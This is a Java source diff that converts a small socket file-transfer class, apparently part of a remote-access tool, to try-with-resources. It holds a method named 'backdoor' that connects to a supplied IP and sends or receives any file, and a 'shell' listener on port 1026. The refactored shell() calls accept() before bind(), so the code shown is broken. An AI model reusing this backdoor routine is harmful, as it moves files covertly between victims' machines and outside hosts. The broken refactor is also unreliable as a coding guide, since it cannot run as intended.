@@ -28,15 +28,16 @@ public class FTP {
 	 * @throws IOException
 	 */
 	public static void shell(String filePath, String protocol) throws IOException {
-		ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();
-		serverSocketChannel.socket().bind(new InetSocketAddress(1026));
-		SocketChannel socketChannel = serverSocketChannel.accept();
+		
+		try(ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();
+				SocketChannel socketChannel = serverSocketChannel.accept();)
+		{
+		serverSocketChannel.socket().bind(new InetSocketAddress(1026));		
 		if (protocol.equals("send"))
 			send(filePath, socketChannel);
 		else if (protocol.equals("rec"))
 			rec(filePath, socketChannel);
-		serverSocketChannel.close();
-		socketChannel.close();
+		}
 	}
 
 	/**
@@ -54,14 +55,15 @@ public class FTP {
 	 * @throws IOException
 	 */
 	public static void backdoor(String filePath, String protocol, String ip) throws IOException {
-		SocketChannel socketChannel = SocketChannel.open();
+		try(SocketChannel socketChannel = SocketChannel.open();)
+		{
 		SocketAddress socketAddress = new InetSocketAddress(ip, 1026);
 		socketChannel.connect(socketAddress);
 		if (protocol.equals("send"))
 			send(filePath, socketChannel);
 		else if (protocol.equals("rec"))
 			rec(filePath, socketChannel);
-		socketChannel.close();
+		}
 	}
 
 	/**
@@ -74,16 +76,15 @@ public class FTP {
 	 * @throws IOException
 	 */
 	private static void send(String filePath, SocketChannel socketChannel) throws IOException {
-		RandomAccessFile file = new RandomAccessFile(new File(filePath), "r");
-		FileChannel fileChannel = file.getChannel();
-		ByteBuffer buffer = ByteBuffer.allocate(1024);
-		while (fileChannel.read(buffer) > 0) {
-			((Buffer) buffer).flip();
-			socketChannel.write(buffer);
-			((Buffer) buffer).clear();
+		try (RandomAccessFile file = new RandomAccessFile(new File(filePath), "r");
+				FileChannel fileChannel = file.getChannel()) {
+			ByteBuffer buffer = ByteBuffer.allocate(1024);
+			while (fileChannel.read(buffer) > 0) {
+				((Buffer) buffer).flip();
+				socketChannel.write(buffer);
+				((Buffer) buffer).clear();
+			}
 		}
-		file.close();
-		fileChannel.close();
 	}
 
 	/**
@@ -96,15 +97,16 @@ public class FTP {
 	 * @throws IOException
 	 */
 	private static void rec(String filePath, SocketChannel socketChannel) throws IOException {
-		RandomAccessFile file = new RandomAccessFile(filePath, "rw");
-		FileChannel fileChannel = file.getChannel();
+		
+		try(RandomAccessFile file = new RandomAccessFile(filePath, "rw");
+				FileChannel fileChannel = file.getChannel();)
+		{
 		ByteBuffer buffer = ByteBuffer.allocate(1024);
 		while (socketChannel.read(buffer) > 0) {
 			((Buffer) buffer).flip();
 			fileChannel.write(buffer);
 			((Buffer) buffer).clear();
 		}
-		file.close();
-		fileChannel.close();
+		}
 	}
 }
